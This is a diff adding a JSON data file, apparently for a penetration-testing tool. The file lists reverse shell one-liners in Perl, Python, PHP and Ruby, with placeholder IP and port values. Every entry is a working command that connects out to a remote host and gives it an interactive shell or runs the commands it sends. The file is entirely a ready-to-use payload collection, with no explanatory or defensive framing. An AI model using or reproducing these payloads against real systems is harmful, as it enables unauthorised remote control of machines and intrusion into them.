@@ -1,0 +1,46 @@
+{
+    "perl": [
+        {
+            "reverse": "perl -e 'use Socket;$i=\"<IP>\";$p=<PORT>;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+        },
+        {
+            "reverse": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"<IP>:<PORT>\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+        },
+        {
+            "reverse": "perl -MIO -e \"$c=new IO::Socket::INET(PeerAddr,'<IP>:<PORT>');STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;\""
+        }
+    ],
+    "python": [
+        {
+            "reverse": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+        }
+    ],
+    "php": [
+        {
+            "reverse": "php -r '$s=fsockopen(\"<IP>\",<PORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        },
+        {
+            "reverse": "php -r '$s=fsockopen(\"<IP>\",<PORT>);shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        },
+        {
+            "reverse": "php -r '$s=fsockopen(\"<IP>\",<PORT>);`/bin/sh -i <&3 >&3 2>&3`;'"
+        },
+        {
+            "reverse": "php -r '$s=fsockopen(\"<IP>\",<PORT>);system(\"/bin/sh -i <&3 >&3 2>&3\");'"
+        },
+        {
+            "reverse": "php -r '$s=fsockopen(\"<IP>\",<PORT>);popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'"
+        }
+    ],
+    "ruby": [
+        {
+            "reverse": "ruby -rsocket -e'f=TCPSocket.open(\"<IP>\",<PORT>).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+        },
+        {
+            "reverse": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"<IP>\",\"<PORT>\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+        },
+        {
+            "reverse": "ruby -rsocket -e \"c=TCPSocket.new('<IP>','<PORT>');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end\""
+        }
+    ]
+}
